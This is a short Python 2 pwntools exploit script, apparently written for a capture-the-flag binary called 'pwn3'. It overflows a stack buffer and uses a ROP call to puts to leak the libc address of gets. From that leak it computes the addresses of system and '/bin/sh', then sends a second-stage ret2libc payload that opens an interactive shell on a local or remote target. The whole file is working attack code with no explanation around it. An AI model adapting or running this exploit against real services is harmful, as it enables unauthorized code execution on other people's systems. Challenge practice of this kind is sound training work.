#!/usr/bin/env python2
from pwn import *

local = True
#local = False
HOST = "localhost"
PORT = 4444 

elf = ELF("./pwn3")
if local:
    p = process("./pwn3")
else:
    p = remote(HOST,PORT)
padding = "A"*0x8c
puts = elf.plt["puts"]
main = elf.symbols["main"]
payload = padding
payload += p32(puts)
payload += p32(main)
payload += p32(elf.got["gets"])
open("payload","wb").write(payload)
print p.recv()
p.sendline(payload)
gets = u32(p.recv(4))
libc_base_address = gets - 0x690d0
system = libc_base_address + 0x3e8f0
binsh = libc_base_address + 0x17faaa
print "gets is present at: {}".format(hex(gets))
print "system is at {}".format(hex(system))
print "binsh is at {}".format(hex(binsh))
print "Sending second stage..."
print p.recv()
payload2 = "A"*0x84 
payload2 += p32(system)
payload2 += p32(0xdeadbeef)
payload2 += p32(binsh)
p.sendline(payload2)
p.interactive()
